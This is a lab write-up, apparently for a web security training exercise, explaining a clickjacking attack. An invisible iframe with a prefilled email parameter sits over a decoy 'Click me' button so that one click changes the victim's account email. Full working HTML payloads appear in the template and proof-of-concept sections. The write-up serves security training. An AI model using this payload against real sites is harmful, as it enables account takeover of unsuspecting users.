# **Prefilled Form Input Clickjacking Lab Write-Up**

## **Objective**
The goal of this lab is to use a clickjacking attack to trick a victim into unknowingly submitting a form that updates their email address to one controlled by the attacker.

---

## **Steps to Solve**

### **1. Log in to the Target Website**
- Use the provided credentials to log in to the target website.
- Navigate to the "My Account" page to observe the email update form.

### **2. Access the Exploit Server**
- Go to the exploit server provided by the lab.

### **3. Use the HTML Template**
- In the **"Body"** section of the exploit server, paste the following HTML template:

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height:700px;
        opacity:0.1; /* Adjusted for alignment, will change later */
        z-index:2;
    }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index:1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

### **4. Modify the Template**
- Replace `YOUR-LAB-ID` with the unique lab ID so the iframe URL points to the **My Account** page.
- Set the dimensions and position of the iframe and decoy content:
  - **Iframe Dimensions**: `width: 500px`, `height: 700px`.
  - **Decoy Position**: `top: 500px`, `left: 60px`.
- Initially, set the iframe's `opacity` to `0.1` for alignment purposes.

### **5. Align the Decoy Content**
- Click "Store" and then "View exploit."
- Hover over the "Click me" text:
  - If the cursor changes to a hand, the alignment is correct.
  - If not, adjust the `top` and `left` values of the `div` element in the CSS and repeat.

### **6. Finalize the Exploit**
- Once aligned:
  - Change `opacity: 0.1` to `opacity: 0.0001` to make the iframe effectively invisible.
  - Update the `div` content to "Click me."
  - Modify the email address in the iframe URL to a different value (e.g., `victim@attacker-website.com`).

### **7. Deliver the Exploit**
- Submit the exploit to the victim by clicking "Deliver to victim."
- Once the victim interacts with the decoy content, their email address will be updated to the attacker's value.

---

## **Proof of Concept (PoC)**
Here’s the finalized HTML code used in the attack:

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height:700px;
        opacity:0.0001;
        z-index:2;
    }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index:1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a04003704aff4ee81600c3d00140064.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

---

## **Lab Completion**
Once the victim clicks the "Click me" button, the email address is updated successfully, solving the lab.

---

This write-up provides step-by-step guidance to complete the lab and demonstrate the potential risks associated with clickjacking vulnerabilities.
